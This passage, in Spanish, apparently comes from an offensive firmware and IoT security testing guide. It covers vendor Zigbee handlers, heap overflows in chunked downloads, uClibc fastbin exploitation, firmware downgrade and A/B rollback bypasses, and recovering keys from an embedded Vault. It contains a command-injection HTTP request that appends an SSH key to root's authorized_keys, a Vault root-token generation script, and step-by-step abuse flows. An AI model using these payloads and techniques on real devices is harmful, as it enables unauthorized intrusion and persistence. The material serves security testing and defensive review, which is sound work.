Los comandos Zigbee/ZCL específicos del fabricante suelen ser un objetivo mejor que los clústeres estandarizados, porque llegan a **código de análisis personalizado** y a **FSM** internas con validaciones menos probadas.<sup>[[8]](#references)</sup>

Flujo de trabajo práctico:

- Analiza mediante ingeniería inversa el despachador de comandos hasta encontrar el **manejador exclusivo del fabricante**.
- Recupera las tablas de **estado**, **evento**, **comprobación**, **acción** y **estado siguiente** de la FSM.
- Identifica los **estados transitorios** que avanzan automáticamente y las ramas de reintento/error que finalmente restablecen o liberan el estado controlado por el atacante.
- Confirma qué intercambios legítimos del protocolo se requieren para poner el daemon en el estado vulnerable, en vez de asumir que el manejador defectuoso siempre es accesible.

En protocolos sensibles al tiempo, la repetición de paquetes desde un framework de Python puede ser demasiado lenta. Un enfoque más fiable consiste en emular un dispositivo legítimo en hardware real (por ejemplo, un **nRF52840**) con una pila de nivel de fabricante, para poder exponer los **endpoints**, **atributos** y tiempos de commissioning correctos.

### Clase de errores en descargas fragmentadas en daemons integrados

Una clase recurrente de errores de firmware aparece en las descargas fragmentadas de blobs/modelos/configuraciones:<sup>[[8]](#references)</sup>

1. El **primer fragmento** (`offset == 0`) guarda `ctx->total_size` y asigna `malloc(total_size)`.
2. Los fragmentos posteriores solo validan campos **locales al paquete** controlados por el atacante, como `packet_total_size >= offset + chunk_len`.
3. La copia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sin comprobar que no supere el **tamaño asignado originalmente**.

Esto permite que un atacante envíe:

- Un primer fragmento válido con un tamaño total declarado **pequeño** para forzar una asignación pequeña en el heap.
- Un fragmento posterior con el **offset esperado**, pero con un `chunk_len` mayor.
- Un tamaño local al paquete falsificado que supere las comprobaciones nuevas y, aun así, desborde el búfer asignado originalmente.

Cuando la ruta vulnerable depende de la lógica de commissioning, el exploit debe incluir suficiente **emulación del dispositivo** para llevar al objetivo al estado esperado de descarga de modelo o blob antes de enviar los fragmentos malformados.

### Activadores de `free()` basados en el protocolo

En daemons integrados, la forma más fácil de activar la explotación de metadatos del heap suele ser no «esperar a que se ejecute la limpieza», sino **forzar el manejo de errores propio del protocolo**:<sup>[[8]](#references)</sup>

- Envía fragmentos posteriores malformados para llevar la FSM a estados de **reintento** o **error**.
- Supera el límite de reintentos para que el daemon **restablezca el contexto** y libere el búfer corrupto.
- Usa este `free()` predecible para activar primitivas del asignador antes de que el proceso se bloquee por motivos ajenos al exploit.

Esto resulta especialmente útil contra asignadores **musl/uClibc/dlmalloc-like** en Linux integrado, donde corromper los metadatos de los chunks puede convertir la lógica de unlink/unbin en una primitiva de escritura. Un patrón estable consiste en corromper un **campo de tamaño** para redirigir el recorrido del asignador hacia **chunks falsos preparados dentro del búfer desbordado**, en lugar de sobrescribir de inmediato punteros reales de bins y bloquear el proceso.

## Explotación de binarios y prueba de concepto

Desarrollar un PoC para las vulnerabilidades identificadas requiere un conocimiento profundo de la arquitectura del objetivo y programación en lenguajes de bajo nivel. Las protecciones del entorno de ejecución de binarios son poco comunes en sistemas integrados, pero, cuando existen, pueden ser necesarias técnicas como Return Oriented Programming (ROP).

### Notas sobre la explotación de fastbins de uClibc (Linux integrado)

- **Fastbins + consolidación:** uClibc usa fastbins similares a los de glibc. Una asignación grande posterior puede activar `__malloc_consolidate()`, así que cualquier chunk falso debe superar las comprobaciones (tamaño razonable, `fd = 0` y chunks circundantes considerados «en uso»).<sup>[[6]](#references)</sup>
- **Binarios no PIE con ASLR:** si ASLR está habilitado, pero el binario principal **no es PIE**, las direcciones `.data/.bss` dentro del binario son estables. Puedes apuntar a una región que ya se parezca a una cabecera válida de chunk del heap para hacer que una asignación de fastbin caiga en una **tabla de punteros a funciones**.
- **NUL que detiene el parser:** al analizar JSON, un `\x00` en el payload puede detener el análisis y conservar los bytes controlados por el atacante que vienen después para un pivote de pila/cadena ROP.
- **Shellcode mediante `/proc/self/mem`:** una cadena ROP que invoque `open("/proc/self/mem")`, `lseek()` y `write()` puede colocar shellcode ejecutable en un mapeo conocido y saltar a él.

## Sistemas operativos preparados para el análisis de firmware

Sistemas operativos como [AttifyOS](https://github.com/adi0x90/attifyos) y [EmbedOS](https://github.com/scriptingxss/EmbedOS) ofrecen entornos preconfigurados para pruebas de seguridad de firmware, equipados con las herramientas necesarias.

## Sistemas operativos preparados para analizar firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS es una distribución pensada para ayudar a realizar evaluaciones de seguridad y pruebas de penetración de dispositivos del Internet de las cosas (IoT). Ahorra mucho tiempo al ofrecer un entorno preconfigurado con todas las herramientas necesarias.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operativo para pruebas de seguridad en sistemas integrados basado en Ubuntu 18.04, con herramientas de pruebas de seguridad de firmware preinstaladas.

## Ataques de downgrade de firmware y mecanismos de actualización inseguros

Aunque un fabricante implemente comprobaciones de firmas criptográficas para las imágenes de firmware, con frecuencia **se omite la protección contra la reversión de versión (downgrade)**. Cuando el cargador de arranque o de recuperación solo verifica la firma con una clave pública integrada, pero no compara la *versión* (ni un contador monótono) de la imagen que se va a instalar, un atacante puede instalar legítimamente un **firmware antiguo y vulnerable que sigue teniendo una firma válida**, reintroduciendo así vulnerabilidades corregidas.<sup>[[4]](#references)</sup>

Flujo de ataque habitual:

1. **Obtén una imagen antigua firmada**
   * Descárgala del portal público de descargas, la CDN o el sitio de soporte del fabricante.
   * Extráela de aplicaciones móviles/de escritorio complementarias (por ejemplo, de `assets/firmware/` dentro de un APK de Android).
   * Búscala en repositorios de terceros como VirusTotal, archivos de Internet, foros, etc.
2. **Carga o sirve la imagen al dispositivo** a través de cualquier canal de actualización expuesto:
   * Interfaz web, API de la aplicación móvil, USB, TFTP, MQTT, etc.
   * Muchos dispositivos IoT de consumo exponen endpoints HTTP(S) *sin autenticación* que aceptan blobs de firmware codificados en Base64, los decodifican en el servidor y activan la recuperación/actualización.
3. Tras el downgrade, explota una vulnerabilidad corregida en una versión posterior (por ejemplo, un filtro contra command injection añadido más adelante).
4. Opcionalmente, vuelve a instalar la imagen más reciente o desactiva las actualizaciones para evitar que te detecten una vez obtenida la persistencia.

### Ejemplo: command injection tras un downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

En el firmware vulnerable (con versión degradada), el parámetro `md5` se concatena directamente en un comando de shell sin sanitización, lo que permite inyectar comandos arbitrarios (en este caso, habilitar el acceso root mediante claves SSH). Las versiones posteriores del firmware introdujeron un filtro básico de caracteres, pero la ausencia de protección contra la degradación vuelve inútil la corrección.<sup>[[4]](#references)</sup>

### Extracción de firmware desde aplicaciones móviles

Muchos proveedores incluyen imágenes de firmware completas en sus aplicaciones móviles complementarias para que la aplicación pueda actualizar el dispositivo por Bluetooth/Wi-Fi. Estos paquetes suelen almacenarse sin cifrar en el APK/APEX en rutas como `assets/fw/` o `res/raw/`. Herramientas como `apktool`, `ghidra` o incluso el comando `unzip` permiten extraer imágenes firmadas sin tocar el hardware físico.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass de anti-rollback solo en el updater en diseños de slots A/B

Algunos proveedores sí implementan un **ratchet** anti-downgrade, pero solo dentro de la lógica del *updater* (por ejemplo, una rutina UDS sobre CAN, un comando de recuperación o un agente OTA en userspace). Si el **bootloader** luego solo comprueba la firma/CRC de la imagen y confía en la tabla de particiones o los metadatos del slot, aún se puede eludir la protección contra rollback.<sup>[[7]](#references)</sup>

Diseño débil típico:

- Los metadatos del firmware contienen un descriptor de versión y un **ratchet** de seguridad / contador monotónico.
- El updater compara el ratchet de la imagen con un valor almacenado en almacenamiento persistente y rechaza imágenes firmadas más antiguas.
- El bootloader **no** analiza ese ratchet y solo verifica la cabecera, el CRC y la firma antes de arrancar el slot seleccionado.
- La activación del slot se almacena por separado, en una tabla de particiones o en un contador de generación por slot, y **no está vinculada criptográficamente** al digest exacto del firmware validado.

Esto crea una primitiva **validar una imagen / arrancar otra** en sistemas de doble slot. Si el atacante puede hacer que el updater marque el slot B como próximo destino de arranque usando una imagen firmada actual, y luego sobrescribir el slot B antes del reinicio, el bootloader podría arrancar igualmente la imagen degradada, porque solo confía en los metadatos del slot ya confirmados.

Patrón de abuso común:

1. Cargar un firmware **actual y firmado** en el slot pasivo y ejecutar la rutina normal de validación/cambio para que el diseño marque ese slot como el siguiente activo.
2. **No reiniciar todavía**. Volver a ejecutar la rutina de preparación/borrado del slot en la misma sesión.
3. Aprovechar el estado de arranque obsoleto o la lógica obsoleta de selección de slot para que el updater borre el **mismo slot físico** que acaba de promover.
4. Escribir un firmware **más antiguo, pero aún firmado** en ese slot.
5. Omitir la rutina de validación que aplica el ratchet y reiniciar directamente.
6. El bootloader selecciona el slot promovido, solo verifica la firma/integridad y arranca la imagen antigua.

Qué buscar al hacer ingeniería inversa de implementaciones de actualización A/B:

- Selección de slot derivada de **flags de arranque** que no se actualizan tras un cambio exitoso.
- Una rutina del tipo `prepare_passive_slot()` que borra un slot según un estado obsoleto, en lugar del **diseño confirmado actual**.
- Una función del tipo `part_write_layout()` que solo incrementa un **contador de generación** / flag de activo y no almacena el hash de la imagen validada.
- Comprobaciones del ratchet implementadas en userspace o en el código del updater, pero **no** en las etapas de ROM / bootloader / secure boot.
- Rutinas de borrado o recuperación que dejan el slot marcado como arrancable incluso después de eliminar y reescribir su contenido.

### Lista de comprobación para evaluar la lógica de actualización

* ¿Está adecuadamente protegido el transporte/autenticación del *endpoint* de actualización (TLS + autenticación)?
* ¿El dispositivo compara **números de versión** o un **contador monotónico anti-rollback** antes de flashear?
* ¿Se verifica la imagen dentro de una cadena de secure boot (por ejemplo, con firmas comprobadas por el código ROM)?
* ¿El **bootloader aplica el mismo ratchet** que el updater, en lugar de limitarse a comprobar la firma/CRC?
* ¿Los metadatos de activación del slot están **vinculados al digest/versión del firmware validado**, o se puede modificar un slot después de promoverlo?
* Después de que un cambio de slot se completa correctamente, ¿se fuerza el reinicio del dispositivo o siguen siendo accesibles otras rutinas de actualización/borrado en la misma sesión?
* ¿El código de userland realiza comprobaciones de coherencia adicionales (por ejemplo, mapa de particiones permitido, número de modelo)?
* ¿Los flujos de actualización *parcial* o de *backup* reutilizan la misma lógica de validación?

> 💡  Si falta alguno de los puntos anteriores, probablemente la plataforma sea vulnerable a ataques de rollback.

## Firmware vulnerable para practicar

Para practicar la detección de vulnerabilidades en firmware, usa los siguientes proyectos de firmware vulnerable como punto de partida.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperar claves de descifrado de firmware a partir del estado de KMS/Vault integrado

Cuando una imagen de actualización combina metadatos pequeños en texto plano con un blob grande de alta entropía, analiza primero el contenedor antes de intentar fuerza bruta con cualquier cosa:<sup>[[1]](#references)</sup>

- Vuelca las cabeceras, los offsets y los límites de línea con `hexdump`, `xxd`, `strings -tx`, `base64 -d` y `binwalk -E`.
- `Salted__` suele indicar el formato `enc` de OpenSSL: los siguientes 8 bytes son la sal y los bytes restantes son el texto cifrado.
- Un campo Base64 que se decodifica exactamente a `256` bytes es un indicio sólido de que se trata de un texto cifrado RSA-2048 que envuelve una contraseña aleatoria del firmware/clave de sesión.
- El material PGP separado del archivo suele proteger solo la autenticidad; no des por hecho que es el mecanismo de confidencialidad.

Si la búsqueda estática de claves (`grep`, `strings`, búsquedas de PEM/PGP) falla, analiza mediante ingeniería inversa la **ruta operativa de descifrado** en lugar de limitarte a buscar claves privadas:

- Descompila el binario del updater / de gestión y rastrea quién lee el blob cifrado, qué helper/API lo desenvuelve y qué nombre lógico de clave solicita.
- Busca en el sistema de archivos root extraído el estado de KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), además de los archivos de unidad y scripts de inicio.
- Considera que los comandos `vault operator unseal ...` en texto plano, las claves de recuperación, los tokens de bootstrap o los scripts locales de auto-unseal de KMS equivalen a material de clave privada.

Si el dispositivo incluye el binario original de Vault y el backend de almacenamiento, suele ser más fácil reproducir ese entorno que volver a implementar los componentes internos de Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Con root en el KMS clonado:

- Haz que las claves transit sean exportables solo dentro del clon aislado: `vault write transit/keys/<name>/config exportable=true`
- Exporta la clave unwrap: `vault read transit/export/encryption-key/<name>`
- Prueba la clave RSA recuperada con el par exacto de padding/hash que usa el KMS. Que fallen el descifrado PKCS#1 v1.5 y el descifrado OAEP predeterminado **no** demuestra que la clave sea incorrecta; muchos flujos respaldados por Vault usan OAEP con SHA-256, mientras que las bibliotecas comunes usan SHA-1 de forma predeterminada.
- Si el payload empieza por `Salted__`, reproduce exactamente el KDF de OpenSSL del proveedor (`EVP_BytesToKey`, a menudo MD5 en dispositivos antiguos) antes de intentar descifrar AES-CBC.

Esto convierte el problema del «firmware cifrado» en uno más general: **recuperar las claves operativas del dispositivo y reproducir offline los parámetros exactos de unwrap + KDF**.

## Formación y certificaciones

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Descifrado de firmware con Claude: habilidades de nivel sénior, autonomía de nivel júnior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodología de pruebas de seguridad de firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking práctico de IoT: la guía definitiva para atacar el Internet de las cosas](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Explotación de zero days en hardware abandonado – blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Cómo un dispositivo inteligente de 20 $ me dio acceso a tu hogar](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Ahora me ves: ahora estás pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Explotación del Tesla Wall Connector desde su puerto de carga - Parte 2: eludir la protección contra downgrades](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Haz que parpadee: explotación over-the-air del Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS en QEMU, parte 1: desempaquetado](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Documentación del kernel de Linux - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS en QEMU, parte 2: depuración y corrección](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Contraseñas de BIOS de Dell: el cifrado XOR débil permite recuperarlas desde la memoria SPI (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Herramientas para recuperar contraseñas de BIOS de Dell](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
